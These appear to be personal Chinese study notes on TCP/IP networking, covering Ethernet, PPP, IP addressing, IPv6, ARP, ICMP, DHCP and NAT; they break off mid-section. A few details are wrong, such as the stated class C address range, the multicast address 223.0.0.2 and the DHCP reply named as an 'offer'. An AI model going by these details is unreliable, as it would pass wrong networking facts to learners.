OSI参考模型和TCP/IP参考模型的关系：

![参考模型对比](参考模型对比.png)

一些重要的协议：IP/ICMP/ARP/TCP/UDP/HTTP/FTP/远程登录TELNET和SSH/网络管理SNMP。

在每个分层中，都会对所发送的数据附加一个首部，从下一层的角度来看，从上一层收到的包被认为是本层的数据：

![数据包首部](数据包首部.png)

几种数据的单位：包（全能性术语）、帧（数据链路层中包的单位）、数据报（IP和UDP等网络层以上的分层中包的单位）、段（TCP数据流中的信息）、消息（应用协议中数据的单位）

# 数据链路

数据链路层的协议定义了通过通信媒介互联的设备之间的传输规范。计算机以0和1来表示信息，然而实际的通信媒介之间的处理却是电压的高低、光的闪灭及电波的强度，把这些信号与0和1进行转换就是物理层的责任。数据链路层把数据集合整合为一个叫做帧的块，然后再进行传输。

数据链路的段指的是一个被分割的网络，如引入中继器将两条网线相连组成一个网络，从网络层的概念来看，它是一个网络，两条网线组成一个段；从物理层的概念来看，一条网线是一个段：

![数据链路的段](数据链路的段.png)

## 数据链路相关技术

数据链路层提供直连两个设备之间的通信功能。

### MAC地址

MAC地址用于识别数据链路中互连的节点，MAC地址长48bit，任何一个网卡的MAC地址都是唯一的，在全世界都不会有重复。

MAC地址由 单播/多播标识、全局/本地标识、厂家号、产品号组成：

![QQ图片20220227164830](QQ图片20220227164830.png)

比特流在网络中的流动顺序，每8比特替换一次先后顺序，一般MAC地址由16进制表示（一个16进制的数字占4bit，共12个，48bit）：![QQ图片20220227165141](QQ图片20220227165141.png)

### 共享介质型网络

从通信介质的使用方法来看，网络可分为共享介质型和非共享介质型。

共享介质型网络就是多个设备共享一个通信介质的一种网络。最早的以太网和FDDI就是这种网络。这种方式，设备之间使用同一个载波信道进行发送和接收，是采用半双工通信的方式。

共享介质型网络中分为两种介质访问控制方式：争用方式和令牌传递方式.

（1）争用方式是指争夺获取数据传输的权力，也叫CSMA（载波监听多路访问），网络中的各个站（数据链路中的节点）采用先到先得的方式占用信道发送数据，若多个站同时发送则会发送冲突现象：

![争夺方式](争夺方式.png)

在一部分以太网中，采用了改良CSMA的另一种方式：CSMA/CD（Carrier Sense Multiple Access with Collision Detection），它会要求每个站提前检查冲突，一旦发生冲突，则放弃发送数据，尽早释放信道，随机延时一段时间再重新争用。![争夺方式1](争夺方式1.png)

（2）令牌传递方式。令牌传递方式是指各站循环平等的获得一种叫令牌的特殊报文，只有获得令牌的站才能发送数据，这种方式不会有冲突，但是在网络不拥堵的情况下数据链路的利用率达不到100%

### 非共享介质型网络

非共享介质方式中，网络中的每个站直连交换机，由交换机负责转发数据帧，发送端和接收端不共享通信介质，很多情况下是采用全双工通信的.

这种方式不需要CSMA/CD机制就可以实现更高效的通信，当然也有一个致命的缺点：当交换机发生故障，则与之相连的所有计算机都无法通信。

### 半双工和全双工通信

半双工通信的一端只能发送或者只能接受，收发数据共享同一个介质。

全双工是指通信的一段能同时发送和接受，收发数据有专门的接受和发送介质：

![全双工通信](全双工通信.png)

### 根据MAC地址转发

交换机是持有多个端口的网桥，它们根据数据链路层中的每个帧的目标MAC地址，决定从那个网络接口发送数据，这个过程用到了转发表。

转发表记录着源MAC地址和曾经接受该数据的接口作为对应关系存入转发表，下一次接受到相同MAC地址就可以直接选择该接口，这个过程叫自学过程。当转发表中没有对应MAC地址的对应端口时，交换机会将数据发送给所有的接口，等待目标主机接受后的回应，然后再更新转发表。

交换机转发方式分为两种：存储转发和直通转发。存储转发检查数据帧末尾的FCS位再进行转发，可以避免发送因冲突或者噪声被破坏的错误帧；直通转发只需要知道目标地址即可转发，速度较快，但是有发送错误帧的可能性。

### 环路检测技术

当网络中出现环路时，数据帧会在环路中被持续转发，导致网络瘫痪。

解决网络中的环路问题具体有生成树和源路两种方式。

生成树方式由IEEE定义，每个网桥必须每1-10秒内交换BPDU包，从而判断哪些端口不使用，以消除环路，一旦发生故障，还可以使用那些端口以便进行继续传输。生成树协议通过检查网络的结构，来识别并标记不使用的端口。网桥的每个端口都可以设置权重，权重可以由网络管理员适当的设置。当发生故障切换网络时，可能需要的时间较长，IEEE中定义的RSTP方法，可以有效缩短故障恢复的时长。

源路由法最早由IBM提出，前提是发送端具备源路由的功能，此时就可以根据数据判断是哪个网桥传输过来的，并将该信息记录进RIF，通过RIF信息就可以避免环路。

### VLAN虚拟局域网

在进行网络管理时，有时会为了分散网络负载变换网络设备的位置，此时就不得不对硬件线路进行改造。VLAN技术解决了这个问题，VLAN就是交换机按照端口区分了多个网段，从而区分了广播数据传播的范围，提高了网络的安全性。

对VLAN进行扩展，又定义了TAG VLAN，它对每个网段都使用一个VLAN ID的唯一标识，来决定数据帧发送给哪个网段，它允许包含跨越异构交换机的网段。通过变换这些标签就能对网络结构进行改造。

## 以太网

以太网是应用最广泛的数据链路。名为10BASE2的以太网，10代表10Mbps的传输速度,2代表传输介质。以太网的主要分类：

![以太网分类](以太网分类.png)

注意这里的传输速度和二进制无关，1M=1000K，它是以时钟频率决定传输速度的。

以太网最初采用半双工通信的CSMA/CD方式，后来达到速度瓶颈后逐渐采用ATM交换技术，以太网由IEEE（美国电子和电气工程师协会）来标准化。

### 帧格式

以太网帧前端是前导码，长度是8个字节，它代表一个以太网帧的开始，也是对端网卡能够确保与其同步的标志。前导码的最后两位是11，它叫SFD（Start Frame Delimiter），这之后就是以太网帧的本体：

![前导码](前导码.png)

以太网帧的本体最前端是以太网的首部，共14个字节，分别是6个字节的目标MAC地址、6个字节的源MAC地址、2个字节的上层协议类型。

帧的末尾是一个4个字节的FCS（Frame Check Sequence，帧检验序列）：

![以太网帧体](以太网帧体.png)

类型代表以太网的再上一层的网络协议的类型，常用的有IPv4、IPv6等。

FCS可以用来检查帧是否有损坏，电子噪声可以破坏帧数据。FCS中保存着整个帧的计算结果，若在接受端发现计算结果不对，则说明是错误帧。

IEEE802.3 Ethernet与一般的以太网在帧的首部上稍有区别，没有类型，而是多了帧长度和LLC、SNAP（上层协议的信息就保存在这里）：

![IEEE802.3帧格式](IEEE802.3帧格式.png)

在VLAN中帧格式中又会加入VLAN ID的信息：

![VLAN帧格式](VLAN帧格式.png)

数据链路层又可以被细分为介质访问控制层和逻辑链路控制层，介质访问控制层根据不同数据链路帧格式中特有的首部信息进行控制，而逻辑链路控制层根据共有的帧头信息进行控制。

## 无线通信

无线通信一般使用电磁波、红外线、激光等方式进行传播数据，在办公室的局域网范围内组成的较高速的连接被称为无线局域网。

![无线通信](无线通信.png)

## PPP协议

PPP（Point-to-Point Protocol）是指点对点，1对1连接计算机的协议，它是数据链路层协议。

在开始进行数据传输前，要先建立一个PPP级的连接，并进行验证，验证通过后在PPP的基础上再传输IP包。PPP协议分为两个部分：

1、不依赖上层的LCP（Link Control Protocol）协议，主要负责建立和断开连接，设置最大接收单元，设置验证协议、是否进行通信质量监控

2、依赖上层的NCP（Network Control Protocol）协议，负责设置IP地址及相关协商。

PPP连接时，需要进行用户名和密码的验证，并涉及通信的两个方向，涉及的验证协议主要有两种：PAP和CHAP，前者需要通过两次握手进行验证，密码通过明文传输；后者采用一次性密码，可以有效防止窃听，并且可以进行定期密码交换。

PPP的帧格式前后用两个标志码来区分数据：

![PPP帧格式](PPP帧格式.png)

由于前后的标志字节有6个连续的1，所以中间位置不允许出现6个及以上连续的1，若帧数据中存在这种数据时，必须在5个连续的1后插入一个0，在接受及发送的时候会做这种插入和还原的处理，这就是为什么PPP协议给计算机带来大量负荷。

PPPoE（PPP over Ethernet）是适用于以太网的PPP功能，单纯的以太网没有验证功能，也没有断开和建立连接的处理，该协议规定了会话ID来保证其功能。

## 其他数据链路

### ATM

ATM是一种面向连接的数据链路，在进行通信传输之前一定要设置通信线路，并允许多个对端同时建立通信连接。传输的基本单位被称为信元（5字节首部+48字节数据）。ATM没有发送权限的控制，它允许在任何时候发送任何数据。

多个通信设备通过一条电缆相连，这样的连接设备被称为TDM（时分复用设备），在连接的时候，以时间作为信号分割的参量，各路信号在时间轴上互不重叠。ATM采用异步的时分复用，相比同步提升了效率。

同步和异步的对比：

![同步和异步](同步和异步.png)

同步中按照线路的顺序发送帧，此时无论是否有想要发送的数据，时隙会被一直占用，线路利用率较低。而异步的方式，每个帧增加了首部信息，无需按照线路的顺序发送，而是按照数据到达的顺序发送，有效减少了空闲时隙。只不过需要额外增加5个字节的首部，增加了网络的开销。

ATM的一个信元只能发送固定的48字节，不能包含IP和TCP的首部信息，所以一般不会单独使用ATM，而是使用上层的AAL（ATM Adapter Layer），在上层为IP的情况下，叫做AAL5，每个IP包最多可以包含192个信元：

![ip包含ATM](ip包含ATM.png)

当这些信元中有一个丢失时，就不能通过AAL5的帧检查位校验，接收端就不得不丢弃所有信元，这是ATM的一个弊端。

还有一些其他的数据链路：

* POS：基于光纤传输的规范
* FDDI：分布式光线数据接口，基于光纤和双绞线
* Token Ring：源自于IBM开发的令牌环LAN技术
* 100VG-AnyLAN：既能应对以太网又能应对令牌环网
* 光纤通道：高速数据通信的一种数据链路
* HIPPI：用于连接超大型计算机的数据链路
* IEEE1394：面向家庭的局域网的外围设备
* HDMI：高清晰多媒体接口，通过一根缆线实现数字信号的高品质传输
* iSCSI：网络直连大规模硬盘
* InfiniBand：针对高端服务器的一种超高速传输接口技术
* DOCSIS：有线电视传输数据
* 高速PLC：室内高速通信

## 公共网络

### 模拟电话线路

模拟电话线路就是利用固定电话线路进行通信，接入电话网。计算机和电话线相连还需要一个将数字信号转化为模拟信号的调制解调器（模拟信号是一系列连续变化的电磁波，数字信号就是0和1）。最后通过ISP（网络业务提供商）接入互联网：

![拨号连接](拨号连接.png)

### 移动通信服务

在服务区范围内就可以连接到运营商的网络

### ADSL

ADSL是对已有的模拟电话线路进行的一种扩展服务，模拟电话线路有一个很大的弊端：通信线路中与电信局的交换机之间的信息传递效率很低，只有发送音频信号时才能显示较好的传输效率。

ADSL在话机到电信局交换机这段线路之间附加一个叫分离器的装置，它将音频信号和数字信号进行隔离，降低噪声干扰：

![ADSL连接](ADSL连接.png)

### FTTH

FTTH（Fiber To The Home）就是一根高速光纤直连到用户家里的方法，它通过一个叫ONU（光网络单元）的装置与计算机相连，负责光信号和电子信号之间的转换，可以实现稳定的高速通信：

![FTTH](FTTH.png)

光缆通常由一条发送数据和另一条接受数据的线对组成，而在FTTH中使用的是WDM，即发送和接受都使用同一根线缆。

### 有线电视

电视最初使用无线电波发送信号，后来因易受干扰发展为使用线缆的有线电视。有线电视接入互联网也需要调制解调器，它利用空闲的频道传输数据实现通信：

![有线电视](有线电视.png)

### 专线

专线连接是一对一连接。

### VPN

VPN是虚拟专用网络，用于连接距离较远的地域，这种服务包括IP-VPN和广域以太网。

IP-VPN即在IP网络上建立VPN，IP包中此时会附加一个叫标签的信息进行传输控制，以辨别目标地址。VPN网关通过对数据包的加密和数据包目标地址的转换实现远程访问。

广域以太网是利用VLAN实现VPN的技术。

### 公共无线LAN

公开可以使用Wi-Fi的服务。

### 其他公共无线通信服务

* X.25：电话网的改良版，允许一个端点连接多个站点
* 帧中继：对X.25进行精简并高速化的网络，允许1对N的通信
* ISDN：综合业务数字网

# IP协议

IP（Internet Protocol）协议负责将数据包发送给最终目标计算机，能够让世界上任何两台计算机之间进行通信。相当于OSI参考模型中的第三层：网络层。

数据链路层的主要作用是在互连同一种数据链路的节点之间进行包传递，一旦跨越多种数据链路，就需要借助网络层。IP的作用和数据链路的区别：

![QQ图片20220312150339](QQ图片20220312150339.png)

配有IP地址的设备、但是不进行路由控制的设备叫主机；既配有IP地址又具有路由控制能力的设备叫路由器，而节点则是主机和路由器的统称。

## IP基础知识

### IP地址和路由控制

在网桥或者交换集线器等物理层或数据链路层数据包转发设备中，不需要设置IP地址，这些设备只需要将IP包转化为0和1并对数据链路帧的数据部分进行转发，不需要IP协议。

不同数据链路的MAC地址的形式不一定一致，因为MAC地址是用来标识同一个链路中不同计算机的一种识别码。而不论哪一种主机与数据链路相连，其IP地址的形式都保持不变。 

路由控制是指将分组数据发送到最终目标地址的功能，一个数据包之所以能够成功到达最终目标地址，全靠路由控制。在发送数据至最终目标地址时，可能会经历多个跳，一跳就是数据链路层以下分层的功能传输数据帧的一个区间，指源MAC地址到目标MAC地址之间传输帧的区间，IP包在其中被转发，IP路由也被叫做多跳路由。

在转发的过程中，每一次只指定下一个路由器或者主机，直至到达最终的目标地址。路由控制表记载着IP数据在下一步应该发给哪个路由器。

### 数据链路的抽象化

数据链路的地址可以被抽象化为IP地址，对IP的上一层来说，屏蔽了数据链路层的实现细节。不同数据链路的最大区别是它们各自的最大传输单位MTU（Maximum Transmission Unit）不同。

为了解决这个问题，IP进行分片处理，将较大的IP包分为多个较小的IP包，分片的包到达对端后再组合起来传给上一层，IP以这种方式抽象化了数据链路层，上层无需关注各数据链路的MTU是多大。

抽象的过程和分批发快递的过程类似：

![QQ图片20220312163640](QQ图片20220312163640.png)

### IP属于面向无连接型

IP在发包之前，不需要建立与对端目标地址之间的连接，即使对端主机不存在数据包还是会被发送出去，发出去的数据何时接受也是不一定的，这种面向无连接的形式可能会有一些冗余的通信。

IP采用面向无连接的原因：1、简化协议2、提升速度

IP上层的TCP采用面向有连接，而IP专注实现传输数据，各协议分层实现，让网络通信变得更简单。

## IP地址的基础知识

### IP地址的定义

IP（IPv4）由32位二进制来表示，表示IP地址时，一般将32位的IP地址每8个一组，每组用点隔开，再将每组转换为十进制数：

![IP地址表示](IP地址表示.png)

IP地址并非是根据主机台数来配置的，而是每一台主机/路由器的网卡来配置的，通常一个网卡设置一个IP地址，也有设置多个的，一台主机/路由器通常都会配置两个以上的网卡，可以设置多个IP地址。

IP地址由网络地址和主机地址两部分组成，网络地址用来标识不同的网络，而主机地址负责在同一个网络中保持唯一性。IP包在被转发时，会利用目标地址的网络标识进行路由，因为即使不看主机标识，只要一看网络标识就能判断该主机是否在该网段中。

192.168.128.10/24中的24代表第1-24位属于网络地址。

网络地址和主机地址的区分主要有根据网络类型分类和根据子网掩码分类两种，现在一般都是基于子网掩码的。

### IP地址的分类

IP地址分为四个级别，它根据IP地址中前4个比特位来划分：

A类地址以0开头，网络标识是1-8位，0.0.0.0 - 127.0.0.0

B类地址以10开头，网络标识是1-16位，128.0.0.1-191.255.0.0

C类地址以110开头，网络标识是1-24位，192.168.0.0-239.255.255.0

D类地址以1110开头，网络标识是1-32位，224.0.0.0-239.255.255.255，D类地址没有主机标识，常被用于多播

IP地址的主机地址一般不能为全0或者全1（网络地址不为空），全0代表IP地址不可获知，全1代表广播地址

### 广播和多播

广播地址就是一个IP地址的网络地址部分不变，主机地址部分全变成1。广播分为本地广播和直接广播两种，本地广播的目标地址就在本网络，IP包不会发送到其他网络；直接广播的目标地址在其他网络，路由器会将数据转发到其他网络。

多播使用D类地址，除了前四位固定的1110，剩下的28位是多播的组编号：

![QQ图片20220406210531](QQ图片20220406210531.png)

从224.0.0.0到224.0.0.255的范围不需要路由控制（？），在同一个链路内也能实现多播，而在这个范围之外设置多播地址会给全网所有组内成员发送多播的包

有些组编号是由特殊意义的，如224.0.0.1表示子网内所有系统，223.0.0.2代表子网内所有路由器。

### 子网掩码

一个IP地址只要确定了其分类就确定了它的网络标识和主机标识，实际情况中很多网络内没有那么多主机，也不要那么多主机号，使用A或者B类IP地址就很浪费，子网掩码就解决了这个问题，子网掩码扩展了原来的设计，让一部分主机地址用作子网地址。

一个IP地址由两种信息组成：IP地址和表示网络部分的子网掩码，子网掩码是一个32位的数字，它对应IP地址的网络标识部分全部为1，对应IP地址的主机标识部分全部为0，子网掩码可以自由的定义自己的网络标识长度。

表示子网掩码用这种方式：172.20.100.52/26，代表网络地址的位数是26，记录网络地址的时候还可以省略后面的0，如172.20.0.0/16和172.20/16是一样的。

![QQ图片20220406212110](QQ图片20220406212110.png)

### CIDR和VLSM

CIDR无类型域间选路，可以将任意多的具有相同前缀的IP地址归为一个网络，大大增加了可用网络数量：

![QQ图片20220406213341](QQ图片20220406213341.png)

在互联网初期一个网络内部采用固定长度的子网掩码，但是一个网络内部有的部门有500台主机，有的部门只有50台，如果采用统一的标准就会出现一个低效的网络结构，为此人们提出了VLSM可变长子网掩码，使一个网络内部采用可变的子网掩码，将IP地址的利用效率提高了50%

### 全局地址和私有地址

随着互联网发展，IP地址重复和不足的问题日益显著，为此出现了一种新技术。它不要求每台主机或路由器都有固定的IP地址，而是只有必要时才分配IP地址。对于独立网络中的主机，它的IP地址只需要保证网络内地址唯一，私有网络有以下几种：

![QQ图片20220406213905](QQ图片20220406213905.png)

在这个范围之外的地址就是全局IP地址。NAT技术诞生后，私有地址的主机经过转换，也可以和拥有全局地址的互联网通信。

## 路由控制

每个IP通信的主机和路由器都有一张路由表，它可以是管理员设置的，也可以是和其他路由器相互交换信息时自动刷新的，这就是静态路由控制和动态路由控制，这些路由表的相关规则就是路由协议。

路由控制表中记录着网络地址与下一步应该发送的目标路由器的地址，匹配时使用的是最长匹配原则。例如172.20.100.52的网络地址和172.20/16与172.20.100/24两项都匹配，此时应该选择匹配度最长的172.20.100/24。

路由表中有一个特殊项是默认路由：0.0.0.0/0，它可以和任何地址匹配。

主机路由的意思是IP地址/32，也就是整个IP地址都参与了路由，不仅仅是网络地址部分，用于不希望通过网络地址路由的情况，但是使用主机路由会使路由表过大。

地址中有一个特殊的地址是127.0.0.1，它是环回地址，使用这个IP时，数据包不会流向网络。

路由控制表的聚合可以减少路由表的条数，提高效率，聚合的操作就是有效信息的整合：

![QQ图片20220406220518](QQ图片20220406220518.png)

## IP分割与再构成

每种数据链路的最大传输单元MTU是不同的，IP属于数据链路层上层，为了解决这个问题有了IP的分片机制，当MTU太小而无法让IP数据在一个帧当中完成发送时，路由器就会把IP数据报划分成3个分片发送，经过分片的IP数据报在目标主机处被重组（之所以不在路由器被重组的原因是有可能产生路由器对分片的结果再分片）

在分片重组的过程中，IP首部的片偏移字段起了重要的作用，它指示了分片在数据报中的位置，让分片得以重组：

![QQ图片20220406222611](QQ图片20220406222611.png)

分片机制的几个不足：

1、路由器的处理负荷加重，高速链路对路由器和计算机网络提出了更高的要求

2、随着人们对网络安全的要求提高，不希望路由器进行IP数据报的分片

3、分片处理中一旦某个分片丢失，整个IP数据报作废

应对上述问题，产生了一种叫路径MTU发现的技术，Path MTU Discovery。路径MTU就是发送端到接受端之间不需要分片时的最大MTU，也就是所有数据链路的最小MTU，这种技术让发送端直接在发送端将数据报分片至路径MTU，以此避免在中途的路由器进行分片处理。

TCP和UDP在使用路径MTU发现的时候有些不同：

UDP场景：

![QQ图片20220406223356](QQ图片20220406223356.png)

TCP场景：

![QQ图片20220406223434](QQ图片20220406223434.png)

不同之处在于：

1、UDP没有重发机制，只能在下一次发送时对数据分片；TCP有重发机制，它会将数据重新发送

2、UDP 数据在IP层分片，因此数据需要在目标主机重组；TCP数据在TCP处分片然后传给IP，IP层无需分片处理，因此也不需要在目标主机重组。

## IPv6

IPv6是为了根本解决IPv4地址耗尽的问题而被标准化的网际协议。IPv6的地址长度是IPv4的4倍，是128bit，一般写为8个16位字节，16位字节用4个16进制数表示，每组用冒号隔开，如果出现连续的0时还可以将这些0省略，并用两个冒号隔开：

~~~
FEDC:BA98:7654:3210:FEDC:BA98:7654:3210
~~~

省略前和省略后：

~~~
1080:0:0:0:8:800:200C:417A
1080::8:800:200C:417A
~~~

IPv6的优点：

1、IP地址扩大，应用分层构造避免让路由表膨胀

2、性能提升：包首部长度采用固定的值，不再采用首部校验码，路由器不再做分片处理，通过路径MTU发现只由发送端主机进行分片处理（IPv6中最小MTU位1280字节，对于有资源限制的设备来说，不需要进行路径MTU发现，直接发送1280字节的IP包）

3、支持即插即用功能：即使没有DHCP服务器也可以实现自动分配IP地址

4、采用认证和加密功能

5、增强多播、Mobile IP功能

### 地址的分类

唯一本地地址：在不直接接入互联网的私有网络中使用

链路本地单播地址：在不使用路由器或者在同一个以太网网段内进行通信

全局单播地址：互联网中的唯一地址

在IPv6中，可以将这些IP地址全部配置在1个NIC中，按需灵活使用。

IPv6类似IPv4，也是通过IP地址的前几位标识来分类的：

![QQ图片20220407213606](QQ图片20220407213606.png)

全局单播地址：48位全局路由前缀，16位子网ID，64位接口ID，也就是主机标识：

![QQ图片20220407214237](QQ图片20220407214237.png)

通常接口ID中保存64位的MAC地址，或者临时生成的临时地址。

链路本地单播地址：开头固定10位，54个0，64位接口ID：

![QQ图片20220407214648](QQ图片20220407214648.png)

唯一本地地址：开头固定7位，L位，40位全局ID，16位子网ID，64位接口ID：

![QQ图片20220407214817](QQ图片20220407214817.png)

## IPv4首部

IP数据报格式：

![QQ图片20220407221818](QQ图片20220407221818.png)

版本：由4个比特位组成，IPv4的版本号是4

首部长度IHL：Internet Header Length，由4比特构成，单位为4字节，对于没有可选项的IP包，首部长度是5，也就是20字节

区分服务TOS：Type Of Service，由8比特构成，其中DSCP（差分服务代码点）段占6位，ECN（显式拥塞通告）段占2位

总长度：由16比特组成，表示IP首部与数据部分合起来的总字节数，IP包的最大长度是65535字节

标识：由16比特组成，同一个分片的标识值相同，不同分片的标识值不同。区分不同分片不仅用到标识，还会检查目标地址、源地址、协议

标志：由3比特组成，表示分片相关信息：

![QQ图片20220407223603](QQ图片20220407223603.png)

片偏移：由13个比特组成，用来标识被分片的每一个分段相对于原始数据的位置，第一个分片对应的值是0，它的单位是8字节，最大可表示8*2的13次方=65536个位置

生存时间：可以中转多少个路由器，每经过一个路由器就减少1，直到变成0就丢包

协议：表示IP首部的下一个首部属于哪个协议

首部校验和：由16比特构成，只校验数据报的首部，不校验数据部分

源地址和目标地址：各由32个比特组成

填充：填充0使首部长度是32比特的整数倍

数据：IP上层协议的首部也在这个里面

## IPv6首部

IPv6的IP首部发生了巨大变化，省略了首部校验和字段，也不必需要计算校验和（TCP和UDP有校验和，提供可靠传输的服务），提高了包的转发效率，减轻了路由器的负担。

![QQ图片20220408220101](QQ图片20220408220101.png)

版本：和IPv4一样由4比特组成，其值为6

通信量类：相当于IPv4的TOS字段，由8比特组成，目前未起作用

流标号：由20比特组成，和服务质量控制有关，相关的协议叫RSVP

有效载荷长度：包的数据部分长度，不包括首部

下一个首部：相当于IPv4的协议字段

跳数限制：可通过路由器个数

源地址和目标地址：各由128比特构成

IPv6的首部长度固定，可选项都放在了扩展首部中。扩展首部可以是任意长度，各种类型的首部用自己的下一个协议类型来指定下个首部的类型：

![QQ图片20220408230532](QQ图片20220408230532.png)

扩展首部也可以起分片的作用，当设置扩展域为44时，它就起到了IPv4中分片的作用。

# IP协议相关技术

## DNS

平时访问网站的时候不直接使用IP地址，而是使用一个字符串，这个字符串就是域名，DNS系统中管理着域名到IP地址之间的关系，可以快速找到一个域名对应的IP地址。

域名是为了识别主机名称和组织机构名称使用的一种具有分层的名称，如：

~~~
kusa.ac.jp
~~~

使用域名时，可以在每个主机名后面追加组织机构的域名，如：

~~~
pepper.kusa.ac.jp
~~~

DNS的分层分为第一层域名等：

![QQ图片20220408232527](QQ图片20220408232527.png)

域名服务器又分为根域名服务器和其他，一层一层检索，直到找到对应的IP地址。为了提高容灾能力，一般会设置至少两个以上的域名服务器。

DNS查询的步骤：

想要找到对应域名的IP地址，首先会访问最近的域名服务器，若能找到对应的IP地址则返回，若找不到，则再向上一层服务器查询，直到找到指定的数据，然后各域名服务器会和解析器（发起请求的计算机）会把信息缓存下来。

DNS除了根据域名检索IP，还可以根据IP查找域名，查找上层或者下层的DNS服务器、存储邮件相关的设置等

## ARP和RARP

在数据链路层通信时，需要知道每个IP地址对应的MAC地址。ARP协议就是以目标IP为线索，定位下一个网络设备对应的MAC地址，如果目标主机不在同一个链路上，可以通过ARP查找下一跳路由器的MAC地址（ARP通常会被路由器隔离，采用代理ARP的路由器可以将ARP包转发给附近的网段）。

ARP只适用于IPv4，不能用于IPv6，IPv6使用ICMPv6来替代ARP发送邻居探索消息。

ARP是借助ARP请求与ARP响应两种类型的包来确定MAC地址的。为了获得目标主机的MAC地址，要广播一个ARP请求包，其中包含着目标IP地址，各主机和路由器若发现和自己IP地址相同，则返回自己的MAC地址，这就是ARP响应。

ARP请求中还携带着自己的MAC地址，这样是为了方便填充ARP缓存表，方便下次直接使用，减少ARP包大量广播的可能性。MAC地址的缓存是有一定期限的，超时将清除缓存。

ARP包格式：

![QQ图片20220409100338](QQ图片20220409100338.png)

其实，无论是IP地址还是MAC地址都能找到通信的目标主机，之所以设置这两个地址，原因在于减少网络流量。若没有MAC地址这一层，那么要找到某个主机就需要广播到全世界的所有主机，造成很大的拥堵。而引入了MAC地址之后，广播查找这个动作的范围就仅限于子网内，随着IP包穿过各子网，包内的目标IP地址不变，但是MAC地址却不断的发生变化（根据ARP不断查找下一个路由器或主机）：

![QQ图片20220409100734](QQ图片20220409100734.png)

RARP是从MAC地址定位IP地址的一种协议，将打印机服务器等小型嵌入式设备接入到网络时就会用到。对于个人电脑来说，可以自己设置IP地址，也可以通过DHCP分配，但是嵌入式设备没有这个能力动态获取IP地址，此时就需要该设备在接入网络时发送一条RARP请求，向RARP服务器询问自己的IP地址，然后设备就可以设置自己的IP地址：

![QQ图片20220409101045](QQ图片20220409101045.png)

## ICMP

ICMP是辅助IP使用的重要协议，它的消息可以分为两类：通知出错原因的错误消息、用于诊断的查询消息。

若某个IP包未能成功发送到目标，ICMP包就会使用IP进行发送，将错误原因转发给最开始发信息的主机：

![QQ图片20220409105945](QQ图片20220409105945.png)

ICMP消息类型分为很多种：

1、目标不可达消息

当IP数据包无法发送到目标地址，IP路由器会返回发送端主机一个目标不可达ICMP消息，其中记录了具体不可达的原因，常见的有主机不可达（路由表没有该主机信息）、MTU探索失败等。

2、重定向消息

如果路由器发现发送端主机使用了次优的路径发送消息，它会返回一个ICMP重定向消息给主机，告诉它更好的路由信息。这个功能一般不使用，因为它本身有可能引发问题。

3、超时消息

这个消息和IP头部信息中的TTL生存周期字段相关，该字段为0时IP包会被丢失，同时路由器发送超时消息给发送端主机。

traceroute 目标主机地址，这个命令可以显示消息发送途中经历的所有路由器的IP地址，它的原理就是发送不同TTL的UDP包，强制接受ICMP超时消息获取信息。

4、回送消息

用于判断发送的数据包是否已经成功达到对端的消息。ping命令就是利用该消息实现的

5、其他消息

包括原点抑制消息（当发送队列不足时，路由器可以发送该消息来让主机了解网络某一处拥堵，一般不使用该功能，因为它可能引起不公平的网络通信）、路由器探索消息（用于发现与自己相连网络中的路由器）

### ICMPv6

ICMP在IPv4中仅起辅助作用，但是在IPv6中，如果没有ICMPv6，则无法正常通信。其中最重要的是邻居探索消息替代了ARP协议的功能。

邻居探索消息融合了IPv4的ARP、ICMP重定向以及ICMP路由器选择消息等功能，还提供自动设置IP地址的功能。

邻居请求消息利用IPv6的多播地址实现传输：

![QQ图片20220409112749](QQ图片20220409112749.png)
IPv6中在没有DHCP服务器的环境也能实现IP地址的自动获取。如果是一个没有路由器的环境，就使用MAC地址作为链路本地单播地址；若有路由器，则从路由器获得IPv6地址前面部分，后面部分则有MAC地址进行设置，此时可以利用路由器请求和宣告消息进行设置处理。

## DHCP

逐一为联网的主机设置IP地址非常繁琐，尤其是对于移动设备而言，每到一个新的地方，都要重新设置IP地址。为了实现自动设置IP地址、统一管理IP地址分配，就产生了DHCP协议。主机只要连接到网络，就可以分配IP地址，让即插即用变得可能。

要使用DHCP需要先架设DHCP服务器，然后将DHCP所要分配的IP地址设置到服务器上，还需要设置子网掩码、路由控制信息、DNS服务器的地址等。

DHCP主要分为两阶段：

1、第一阶段，连入网络的设备发送DHCP发现包，发现包的目标地址是255.255.255.255，源地址是0.0.0.0，代表未知，通过广播的形式发送出去，DHCP服务器接到后返回DHCP提供包，通知可以使用的网络设置。

2、第二阶段，设备发送DHCP请求包，确认使用的网络设置，DHCP服务器返回一个DHCP提供包，表示同意该设置。

区分两个阶段的理由是：为了保证即使在DHCP服务器上重复设置也能正常工作。

DHCP的网络设置结束，就可以进行TCP/IP通信，当不需要IP地址时，可以发送DHCP解除包。DHCP通常都有限制时间的设置，客户端在这个时限之前可以发送DHCP请求包延长使用时间。

为了防止单个DHCP服务器故障导致无法分配IP地址，通常都会架设两台或两台以上的DHCP服务器。启动多个DHCP服务器可能会导致申请的IP冲突，为了避免这种情况要做好DHCP的设置，让它们分配的地址区分开。

为了确保分配的IP地址可用，DHCP服务器会在分配之前给这个IP发送ICMP回送请求包，确认没有响应；DHCP客户端在拿到IP地址后，会给这个IP地址发送ARP请求包，确认没有响应。

当网络分多个网段时，为每个网段设置一个DHCP太过繁琐，因为要对每个DHCP都进行各种设置和维护。为了解决这个问题，让各网段中的路由器承担DHCP中继代理，它可以设置DHCP服务器的IP地址，在分配IP的时候，主机先给中继代理发送请求，中继代理会将请求以单播的形式发送到DHCP服务器：

![QQ图片20220409140732](QQ图片20220409140732.png)

## NAT

NAT是用于本地网络中使用私有地址，在连接互联网时转而使用全局IP地址的技术。NAT是为了解决IPv4地址即将枯竭的问题开发出来的技术。

当两台主机想要通信时，消息通过NAT路由器，NAT路由器会将其私有IP地址转换为全局IP地址。反之，当IP包从外网发来时，NAT路由器会将全局IP地址换成私有IP地址，然后再传给主机：

![QQ图片20220409145520](QQ图片20220409145520.png)

NAT路由器内部有一张映射表，专门用来记录这种转换关系。

### NAPT

当私有网络内的多台机器同时都要和外部进行通信时，若每次都转换IP地址，也会容易造成不够用的情况，此时采用端口和IP一起转换的方式。

对外使用相同的IP地址，子网内不同的主机通信时，采用不同的端口号进行通信：

![QQ图片20220409145717](QQ图片20220409145717.png)

在使用TCP/UDP的通信中，只有目标地址、源地址、目标端口、源端口、协议类型全都相同时，就认为是同一个通信，所以可以用端口来区分不同的通信。这种NAPT转换表也会在路由器中自动生成

### NAT-PT/NAPT-PT

为了让IPv6兼容IPv4，产生了NAT-PT规范，它可以将IPv6的首部转换为IPv4的首部，让两类网络通信，这个功能是由NAT-PT路由器完成的：

